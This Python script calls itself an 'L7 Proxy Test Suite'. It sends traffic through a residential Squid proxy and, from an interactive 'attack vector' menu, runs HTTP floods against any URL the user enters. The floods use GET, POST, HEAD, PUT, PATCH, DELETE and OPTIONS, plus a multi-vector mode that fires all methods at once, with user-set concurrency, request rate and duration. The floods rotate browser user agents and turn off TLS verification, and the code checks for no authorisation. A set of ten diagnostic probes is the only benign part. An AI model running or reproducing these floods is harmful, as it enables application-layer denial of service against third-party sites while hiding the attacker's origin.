#!/usr/bin/env python3
"""
L7 Proxy Test Suite
-------------------
Tests Layer-7 (HTTP/HTTPS application-layer) events through a
Squid/ProxyChains residential proxy at 10.0.10.118:3128.

Modes (selected from interactive menu)
───────────────────────────────────────
  1  Diagnostic      – 10 sequential diagnostic tests
  2  GET Flood
  3  POST Flood
  4  HEAD Flood
  5  PUT Flood
  6  PATCH Flood
  7  DELETE Flood
  8  OPTIONS Flood
  9  Multi-Vector    – fires ALL methods simultaneously

Flood parameters (prompted interactively):
  • Concurrent connections  (workers / threads)
  • Target RPS              (requests-per-second cap)
  • Duration                (seconds to run)
"""

import sys
import time
import socket
import ssl
import json
import threading
import urllib.request
import urllib.error
import urllib.parse
import http.client
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Proxy config ──────────────────────────────────────────────────────────────
PROXY_HOST = "10.0.10.118"
PROXY_PORT = 3128
PROXY_URL  = f"http://{PROXY_HOST}:{PROXY_PORT}"

# ── Colour helpers ─────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
MAGENTA= "\033[95m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

def ok(msg):    print(f"  {GREEN}[+]{RESET} {msg}")
def fail(msg):  print(f"  {RED}[-]{RESET} {msg}")
def info(msg):  print(f"  {CYAN}[*]{RESET} {msg}")
def warn(msg):  print(f"  {YELLOW}[!]{RESET} {msg}")
def section(title):
    print(f"\n{BOLD}{CYAN}{'─'*60}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{BOLD}{CYAN}{'─'*60}{RESET}")

# ── Build a urllib opener that forces all traffic through the proxy ────────────
def build_opener():
    proxy_handler = urllib.request.ProxyHandler({
        "http":  PROXY_URL,
        "https": PROXY_URL,
    })
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    https_handler = urllib.request.HTTPSHandler(context=ctx)
    opener = urllib.request.build_opener(proxy_handler, https_handler)
    opener.addheaders = [
        ("User-Agent",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
         "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"),
        ("Accept",          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Connection",      "keep-alive"),
    ]
    return opener

OPENER = build_opener()

# ─────────────────────────────────────────────────────────────────────────────
# 1. Proxy Reachability
# ─────────────────────────────────────────────────────────────────────────────
def test_proxy_reachability():
    section("TEST 1 – Proxy Reachability (TCP handshake to squid)")
    try:
        t0 = time.time()
        s  = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=5)
        ms = (time.time() - t0) * 1000
        s.close()
        ok(f"Connected to {PROXY_HOST}:{PROXY_PORT} in {ms:.1f} ms")
        return True
    except Exception as e:
        fail(f"Cannot reach proxy: {e}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 2. External IP leak check
# ─────────────────────────────────────────────────────────────────────────────
def test_egress_ip():
    section("TEST 2 – Egress IP via Proxy  (IP-leak check)")
    for url in ["http://httpbin.org/ip", "http://ifconfig.me/ip"]:
        try:
            t0  = time.time()
            req = urllib.request.Request(url)
            with OPENER.open(req, timeout=10) as resp:
                body = resp.read().decode().strip()
            ms  = (time.time() - t0) * 1000
            try:
                ip = json.loads(body).get("origin", body)
            except Exception:
                ip = body
            ok(f"Egress IP reported by {url.split('/')[2]}: {BOLD}{ip}{RESET}  ({ms:.0f} ms)")
            return ip
        except Exception as e:
            warn(f"{url} failed: {e}")
    fail("Could not determine egress IP")
    return None

# ─────────────────────────────────────────────────────────────────────────────
# 3. HTTP GET
# ─────────────────────────────────────────────────────────────────────────────
def test_http_get(target_url):
    section(f"TEST 3 – HTTP GET  →  {target_url}")
    try:
        req = urllib.request.Request(target_url, method="GET")
        t0  = time.time()
        with OPENER.open(req, timeout=15) as resp:
            status  = resp.status
            headers = dict(resp.headers)
            body    = resp.read()
        ms = (time.time() - t0) * 1000
        ok(f"Status        : {status} {resp.reason}")
        ok(f"Response time : {ms:.0f} ms")
        ok(f"Body length   : {len(body):,} bytes")
        info(f"Server        : {headers.get('Server', 'n/a')}")
        info(f"Content-Type  : {headers.get('Content-Type', 'n/a')}")
        info(f"X-Cache       : {headers.get('X-Cache', 'n/a')}")
        return True
    except urllib.error.HTTPError as e:
        warn(f"HTTP error {e.code}: {e.reason}")
        return False
    except Exception as e:
        fail(f"GET failed: {e}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 4. HTTP HEAD
# ─────────────────────────────────────────────────────────────────────────────
def test_http_head(target_url):
    section(f"TEST 4 – HTTP HEAD  →  {target_url}")
    try:
        req = urllib.request.Request(target_url, method="HEAD")
        t0  = time.time()
        with OPENER.open(req, timeout=10) as resp:
            status  = resp.status
            headers = dict(resp.headers)
        ms = (time.time() - t0) * 1000
        ok(f"Status : {status} {resp.reason}  ({ms:.0f} ms)")
        for h in ["Server", "Content-Type", "X-Powered-By",
                  "Strict-Transport-Security", "X-Frame-Options",
                  "X-Content-Type-Options", "Content-Security-Policy"]:
            val = headers.get(h)
            if val:
                info(f"{h:35s}: {val}")
        return True
    except urllib.error.HTTPError as e:
        warn(f"HTTP {e.code} on HEAD – trying GET fallback")
        return False
    except Exception as e:
        fail(f"HEAD failed: {e}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 5. HTTP OPTIONS
# ─────────────────────────────────────────────────────────────────────────────
def test_http_options(target_url):
    section(f"TEST 5 – HTTP OPTIONS  →  {target_url}")
    try:
        req = urllib.request.Request(target_url, method="OPTIONS")
        req.add_header("Origin", "https://evil.lab")
        req.add_header("Access-Control-Request-Method", "GET")
        t0  = time.time()
        with OPENER.open(req, timeout=10) as resp:
            headers = dict(resp.headers)
            status  = resp.status
        ms = (time.time() - t0) * 1000
        ok(f"Status : {status}  ({ms:.0f} ms)")
        for h in ["Allow", "Access-Control-Allow-Origin",
                  "Access-Control-Allow-Methods",
                  "Access-Control-Allow-Headers"]:
            val = headers.get(h)
            if val:
                info(f"{h:40s}: {val}")
        return True
    except urllib.error.HTTPError as e:
        warn(f"HTTP {e.code} – server may not allow OPTIONS")
    except Exception as e:
        fail(f"OPTIONS failed: {e}")
    return False

# ─────────────────────────────────────────────────────────────────────────────
# 6. Redirect-chain follow
# ─────────────────────────────────────────────────────────────────────────────
def test_redirect_chain(target_url):
    section(f"TEST 6 – Redirect Chain  →  {target_url}")
    visited = []
    current = target_url

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    no_redir_opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({"http": PROXY_URL, "https": PROXY_URL}),
        urllib.request.HTTPSHandler(context=ctx),
        NoRedirect(),
    )
    no_redir_opener.addheaders = OPENER.addheaders

    for hop in range(10):
        try:
            req = urllib.request.Request(current)
            with no_redir_opener.open(req, timeout=10) as resp:
                status   = resp.status
                location = resp.headers.get("Location")
                visited.append((hop + 1, current, status))
                if status not in (301, 302, 303, 307, 308) or not location:
                    break
                current = urllib.parse.urljoin(current, location)
        except urllib.error.HTTPError as e:
            visited.append((hop + 1, current, e.code))
            break
        except Exception as e:
            fail(f"Redirect hop {hop+1} error: {e}")
            break

    for hop, url, code in visited:
        colour = GREEN if str(code).startswith("2") else YELLOW
        print(f"  {colour}Hop {hop}: [{code}] {url}{RESET}")

# ─────────────────────────────────────────────────────────────────────────────
# 7. DNS resolution
# ─────────────────────────────────────────────────────────────────────────────
def test_dns(hostname):
    section(f"TEST 7 – DNS Resolution  →  {hostname}")
    try:
        t0      = time.time()
        results = socket.getaddrinfo(hostname, 80)
        ms      = (time.time() - t0) * 1000
        ips: list[str] = list({str(r[4][0]) for r in results})
        ok(f"Resolved in {ms:.1f} ms  →  {', '.join(ips)}")
        return ips
    except Exception as e:
        fail(f"DNS failed: {e}")
        return []

# ─────────────────────────────────────────────────────────────────────────────
# 8. TLS/SSL Certificate info
# ─────────────────────────────────────────────────────────────────────────────
def test_tls(hostname, port=443):
    section(f"TEST 8 – TLS Certificate  →  {hostname}:{port}")
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        proxy_conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=10)
        proxy_conn.set_tunnel(hostname, port)
        proxy_conn.connect()
        raw_sock = proxy_conn.sock

        tls_sock = ctx.wrap_socket(raw_sock, server_hostname=hostname)
        cert     = tls_sock.getpeercert()
        cipher   = tls_sock.cipher()
        proto    = tls_sock.version()
        tls_sock.close()

        ok(f"TLS version : {proto}")
        ok(f"Cipher      : {cipher[0] if cipher else 'n/a'}")
        if cert:
            cert_any: dict = cert  # type: ignore[assignment]
            subject: dict = {}
            for rdn in cert_any.get("subject", []):
                for attr in rdn:
                    subject[attr[0]] = attr[1]
            issuer: dict = {}
            for rdn in cert_any.get("issuer", []):
                for attr in rdn:
                    issuer[attr[0]] = attr[1]
            info(f"Subject CN  : {subject.get('commonName', 'n/a')}")
            info(f"Issuer      : {issuer.get('organizationName', 'n/a')}")
            info(f"Not before  : {cert_any.get('notBefore', 'n/a')}")
            info(f"Not after   : {cert_any.get('notAfter',  'n/a')}")
        else:
            warn("Certificate data not exposed (verify mode is CERT_NONE)")
        return True
    except Exception as e:
        fail(f"TLS probe failed: {e}")
        return False

# ─────────────────────────────────────────────────────────────────────────────
# 9. HTTP POST
# ─────────────────────────────────────────────────────────────────────────────
def test_http_post(target_url):
    section(f"TEST 9 – HTTP POST  →  {target_url}")
    payload = json.dumps({"test": "l7_probe", "ts": datetime.utcnow().isoformat()}).encode()
    try:
        req = urllib.request.Request(target_url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        t0  = time.time()
        with OPENER.open(req, timeout=15) as resp:
            status = resp.status
            body   = resp.read()
        ms = (time.time() - t0) * 1000
        ok(f"Status : {status}  ({ms:.0f} ms)  body={len(body):,} bytes")
        return True
    except urllib.error.HTTPError as e:
        warn(f"HTTP {e.code} on POST ({e.reason}) – may be expected")
    except Exception as e:
        fail(f"POST failed: {e}")
    return False

# ─────────────────────────────────────────────────────────────────────────────
# 10. Latency benchmark
# ─────────────────────────────────────────────────────────────────────────────
def test_latency(target_url, samples=10):
    section(f"TEST 10 – Latency Benchmark  ({samples}× GET)  →  {target_url}")
    times = []
    for i in range(1, samples + 1):
        try:
            req = urllib.request.Request(target_url, method="HEAD")
            t0  = time.time()
            with OPENER.open(req, timeout=10) as resp:
                resp.read()
            ms = (time.time() - t0) * 1000
            times.append(ms)
            print(f"    Sample {i:>2}/{samples}: {ms:>7.1f} ms")
        except Exception as e:
            warn(f"Sample {i} failed: {e}")
        time.sleep(0.3)

    if times:
        avg  = sum(times) / len(times)
        mn   = min(times)
        mx   = max(times)
        jit  = mx - mn
        ok(f"Min={mn:.1f} ms  Avg={avg:.1f} ms  Max={mx:.1f} ms  Jitter={jit:.1f} ms")
    else:
        fail("No latency samples collected")

# ─────────────────────────────────────────────────────────────────────────────
# FLOOD ENGINE
# ─────────────────────────────────────────────────────────────────────────────

_BODY_METHODS = {"POST", "PUT", "PATCH"}

_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

def _single_request(target_url: str, idx: int, method: str) -> tuple[bool, float, int]:
    """Fire one request through the proxy; return (ok, latency_ms, status)."""
    opener = build_opener()
    opener.addheaders = [
        ("User-Agent", _USER_AGENTS[idx % len(_USER_AGENTS)]),
        ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
        ("Accept-Language", "en-US,en;q=0.5"),
        ("Connection", "keep-alive"),
    ]
    t0 = time.time()
    try:
        body_data: bytes | None = None
        if method in _BODY_METHODS:
            body_data = json.dumps({
                "probe": "l7_flood",
                "idx": idx,
                "ts": datetime.utcnow().isoformat(),
            }).encode()

        req = urllib.request.Request(target_url, data=body_data, method=method)
        if body_data:
            req.add_header("Content-Type", "application/json")

        with opener.open(req, timeout=10) as resp:
            resp.read()
            status = resp.status
        ms = (time.time() - t0) * 1000
        return True, ms, status
    except urllib.error.HTTPError as e:
        ms = (time.time() - t0) * 1000
        return False, ms, e.code
    except Exception:
        return False, 0.0, 0


def run_flood(
    target_url: str,
    workers: int,
    rps: float,
    duration: float,
    method: str,
    label: str | None = None,
) -> dict:
    """
    Run a flood for `duration` seconds at up to `rps` requests/sec
    using `workers` concurrent connections.
    Returns a summary dict so multi-vector can aggregate results.
    """
    display_label = label or method
    section(
        f"FLOOD — {BOLD}{display_label}{RESET}{CYAN}  |  "
        f"{workers} conns  |  {rps:.0f} RPS target  |  {duration:.0f}s\n"
        f"  {CYAN}Target : {target_url}{RESET}\n"
        f"  {CYAN}Proxy  : {PROXY_URL}{RESET}"
    )

    success      = 0
    errors       = 0
    latencies: list[float] = []
    status_counts: dict[int, int] = {}
    lock         = threading.Lock()

    # Rate-limiter token bucket
    interval     = 1.0 / rps if rps > 0 else 0.0
    wall_start   = time.time()
    deadline     = wall_start + duration
    bar_width    = 40
    total_sent   = 0

    def _print_progress() -> None:
        elapsed = time.time() - wall_start
        pct     = min(elapsed / duration, 1.0)
        filled  = int(bar_width * pct)
        bar     = "█" * filled + "░" * (bar_width - filled)
        actual_rps = total_sent / elapsed if elapsed > 0 else 0
        print(
            f"\r  [{bar}] {elapsed:.1f}/{duration:.0f}s  "
            f"{GREEN}{success}✓{RESET} {RED}{errors}✗{RESET}  "
            f"{CYAN}{actual_rps:.1f} RPS{RESET}   ",
            end="", flush=True
        )

    def _worker(idx: int) -> None:
        nonlocal success, errors, total_sent
        ok_flag, ms, status = _single_request(target_url, idx, method)
        with lock:
            total_sent += 1
            if ok_flag:
                success += 1
            else:
                errors += 1
            if ms > 0:
                latencies.append(ms)
            status_counts[status] = status_counts.get(status, 0) + 1
        _print_progress()

    idx = 0
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = []
        while time.time() < deadline:
            # Throttle submission to match target RPS
            submit_time = time.time()
            futures.append(pool.submit(_worker, idx))
            idx += 1
            # Drain completed futures to avoid memory bloat
            still_running = []
            for f in futures:
                if not f.done():
                    still_running.append(f)
            futures = still_running

            elapsed_submit = time.time() - submit_time
            sleep_needed   = interval - elapsed_submit
            if sleep_needed > 0:
                time.sleep(sleep_needed)

        # Wait for in-flight requests
        for f in futures:
            try:
                f.result(timeout=15)
            except Exception:
                pass

    wall_elapsed = time.time() - wall_start
    print()  # newline after progress bar

    # ── Summary ───────────────────────────────────────────────────────────────
    colour = MAGENTA if label else CYAN   # multi-vector uses magenta label
    print(f"\n{BOLD}  ── {colour}{display_label}{RESET}{BOLD} Flood Summary {'─'*30}{RESET}")
    ok(f"Total sent     : {total_sent:,}")
    ok(f"Succeeded (2xx): {GREEN}{success:,}{RESET}")
    if errors:
        warn(f"Failed         : {RED}{errors:,}{RESET}")
    ok(f"Wall time      : {wall_elapsed:.2f} s")
    ok(f"Throughput     : {BOLD}{total_sent / wall_elapsed:.1f} RPS{RESET}")

    if latencies:
        latencies.sort()
        avg = sum(latencies) / len(latencies)
        p50 = latencies[int(len(latencies) * 0.50)]
        p90 = latencies[int(len(latencies) * 0.90)]
        p99 = latencies[int(len(latencies) * 0.99)]
        ok(f"Latency avg    : {avg:.1f} ms")
        ok(f"Latency p50    : {p50:.1f} ms")
        ok(f"Latency p90    : {p90:.1f} ms")
        ok(f"Latency p99    : {p99:.1f} ms")

    print(f"\n  {DIM}HTTP status breakdown:{RESET}")
    for code in sorted(status_counts):
        col = GREEN if str(code).startswith("2") else (
              YELLOW if str(code).startswith("3") else RED)
        print(f"    {col}HTTP {code}{RESET} : {status_counts[code]:,}")

    return {
        "method":      display_label,
        "total":       total_sent,
        "success":     success,
        "errors":      errors,
        "wall":        wall_elapsed,
        "rps_actual":  total_sent / wall_elapsed if wall_elapsed > 0 else 0,
    }


def run_multi_vector(
    target_url: str,
    workers: int,
    rps: float,
    duration: float,
) -> None:
    """
    Launch all 7 HTTP methods simultaneously, each with its own thread pool.
    Workers and RPS are split evenly across vectors.
    """
    methods = ["GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"]
    n       = len(methods)

    # Divide resources evenly across vectors
    w_each  = max(1, workers // n)
    r_each  = max(1.0, rps / n)

    section(
        f"MULTI-VECTOR FLOOD  |  {n} vectors simultaneously\n"
        f"  {CYAN}{workers} total conns ({w_each}/vector)  |  "
        f"{rps:.0f} total RPS ({r_each:.1f}/vector)  |  {duration:.0f}s{RESET}\n"
        f"  {CYAN}Vectors : {', '.join(methods)}{RESET}\n"
        f"  {CYAN}Target  : {target_url}{RESET}"
    )

    results: list[dict] = []
    result_lock = threading.Lock()

    def _launch(method: str) -> None:
        r = run_flood(
            target_url=target_url,
            workers=w_each,
            rps=r_each,
            duration=duration,
            method=method,
            label=method,
        )
        with result_lock:
            results.append(r)

    threads = [threading.Thread(target=_launch, args=(m,), daemon=True) for m in methods]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # ── Aggregate summary ─────────────────────────────────────────────────────
    total_sent    = sum(r["total"]   for r in results)
    total_success = sum(r["success"] for r in results)
    total_errors  = sum(r["errors"]  for r in results)
    avg_rps       = sum(r["rps_actual"] for r in results)

    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}")
    print(f"{BOLD}{MAGENTA}  MULTI-VECTOR AGGREGATE SUMMARY{RESET}")
    print(f"{BOLD}{MAGENTA}{'='*60}{RESET}")
    ok(f"Vectors fired  : {n}  ({', '.join(methods)})")
    ok(f"Total requests : {total_sent:,}")
    ok(f"Succeeded      : {GREEN}{total_success:,}{RESET}")
    if total_errors:
        warn(f"Failed         : {RED}{total_errors:,}{RESET}")
    ok(f"Combined RPS   : {BOLD}{avg_rps:.1f}{RESET}")
    print(f"\n  {'Method':<10} {'Sent':>8} {'2xx':>8} {'Fail':>8} {'RPS':>8}")
    print(f"  {'─'*46}")
    for r in sorted(results, key=lambda x: x["method"]):
        print(
            f"  {CYAN}{r['method']:<10}{RESET}"
            f" {r['total']:>8,}"
            f" {GREEN}{r['success']:>8,}{RESET}"
            f" {RED}{r['errors']:>8,}{RESET}"
            f" {r['rps_actual']:>8.1f}"
        )
    print(f"\n{BOLD}{MAGENTA}{'='*60}{RESET}\n")


# ─────────────────────────────────────────────────────────────────────────────
# Interactive helpers
# ─────────────────────────────────────────────────────────────────────────────

def _prompt_int(prompt: str, default: int) -> int:
    try:
        raw = input(f"  {BOLD}{prompt}{RESET} [{default}]: ").strip()
        return int(raw) if raw else default
    except (ValueError, KeyboardInterrupt, EOFError):
        return default

def _prompt_float(prompt: str, default: float) -> float:
    try:
        raw = input(f"  {BOLD}{prompt}{RESET} [{default}]: ").strip()
        return float(raw) if raw else default
    except (ValueError, KeyboardInterrupt, EOFError):
        return default


ATTACK_MENU = [
    ("Diagnostic (10 sequential tests)",  "diag"),
    ("GET Flood",                          "GET"),
    ("POST Flood",                         "POST"),
    ("HEAD Flood",                         "HEAD"),
    ("PUT Flood",                          "PUT"),
    ("PATCH Flood",                        "PATCH"),
    ("DELETE Flood",                       "DELETE"),
    ("OPTIONS Flood",                      "OPTIONS"),
    ("Multi-Vector (all methods at once)", "multi"),
]


def show_menu() -> str:
    """Print the attack-vector menu and return the chosen mode key."""
    print(f"\n{BOLD}{CYAN}  ┌─────────────────────────────────────────────┐{RESET}")
    print(f"{BOLD}{CYAN}  │          SELECT ATTACK VECTOR                │{RESET}")
    print(f"{BOLD}{CYAN}  ├─────────────────────────────────────────────┤{RESET}")
    for i, (label, _) in enumerate(ATTACK_MENU, 1):
        icon = "⚡" if _ == "multi" else ("🔍" if _ == "diag" else "💥")
        print(f"{BOLD}{CYAN}  │{RESET}  {BOLD}{i:>2}.{RESET} {icon}  {label:<38}{BOLD}{CYAN}│{RESET}")
    print(f"{BOLD}{CYAN}  └─────────────────────────────────────────────┘{RESET}")

    while True:
        try:
            raw = input(f"\n  {BOLD}Enter choice (1–{len(ATTACK_MENU)}): {RESET}").strip()
            idx = int(raw) - 1
            if 0 <= idx < len(ATTACK_MENU):
                label, mode = ATTACK_MENU[idx]
                print(f"  {GREEN}✔  Selected:{RESET} {BOLD}{label}{RESET}")
                return mode
            else:
                warn(f"Please enter a number between 1 and {len(ATTACK_MENU)}")
        except (ValueError, KeyboardInterrupt, EOFError):
            print("\nAborted.")
            sys.exit(0)


def prompt_flood_params() -> tuple[int, float, float]:
    """Ask only for concurrent connections, target RPS, and duration."""
    print(f"\n{BOLD}{CYAN}  ── Flood Parameters ──────────────────────────{RESET}")
    workers  = _prompt_int("Concurrent connections (workers)", 50)
    rps      = _prompt_float("Target RPS (requests/sec)",       100.0)
    duration = _prompt_float("Duration (seconds)",               30.0)
    return workers, rps, duration


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  L7 Proxy Test Suite — Squid @ {PROXY_HOST}:{PROXY_PORT}{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"{DIM}  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")

    # ── Get target URL ────────────────────────────────────────────────────────
    try:
        raw = input(f"\n{BOLD}  Enter target URL (e.g. https://example.com): {RESET}").strip()
    except (KeyboardInterrupt, EOFError):
        print("\nAborted.")
        sys.exit(0)

    if not raw:
        fail("No URL provided. Exiting.")
        sys.exit(1)

    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw

    parsed     = urllib.parse.urlparse(raw)
    target_url = raw
    hostname   = parsed.hostname or ""
    use_https  = parsed.scheme == "https"
    tls_port   = parsed.port or 443

    print(f"\n{DIM}  Target URL : {target_url}{RESET}")
    print(f"{DIM}  Hostname   : {hostname}{RESET}")
    print(f"{DIM}  Proxy      : {PROXY_URL}{RESET}")

    # ── Always check proxy first ──────────────────────────────────────────────
    if not test_proxy_reachability():
        fail("Proxy is unreachable — aborting.")
        sys.exit(1)

    # ── Mode selection menu ───────────────────────────────────────────────────
    mode = show_menu()

    # ── Diagnostic ────────────────────────────────────────────────────────────
    if mode == "diag":
        test_egress_ip()
        if hostname and not all(c.isdigit() or c == "." for c in hostname):
            test_dns(hostname)
        test_http_get(target_url)
        test_http_head(target_url)
        test_http_options(target_url)
        test_redirect_chain(target_url)
        if use_https and hostname:
            test_tls(hostname, port=tls_port)
        test_http_post(target_url)
        test_latency(target_url)
        print(f"\n{BOLD}{GREEN}{'='*60}")
        print(f"  All L7 tests complete.")
        print(f"{'='*60}{RESET}\n")
        return

    # ── Flood / Multi-vector ──────────────────────────────────────────────────
    workers, rps, duration = prompt_flood_params()

    print(f"\n{DIM}  Workers : {workers}  |  RPS target : {rps:.0f}  |  Duration : {duration:.0f}s{RESET}")

    if mode == "multi":
        run_multi_vector(target_url, workers=workers, rps=rps, duration=duration)
    else:
        run_flood(
            target_url=target_url,
            workers=workers,
            rps=rps,
            duration=duration,
            method=mode,
        )
        print(f"\n{BOLD}{GREEN}{'='*60}")
        print(f"  Flood complete.")
        print(f"{'='*60}{RESET}\n")


if __name__ == "__main__":
    main()
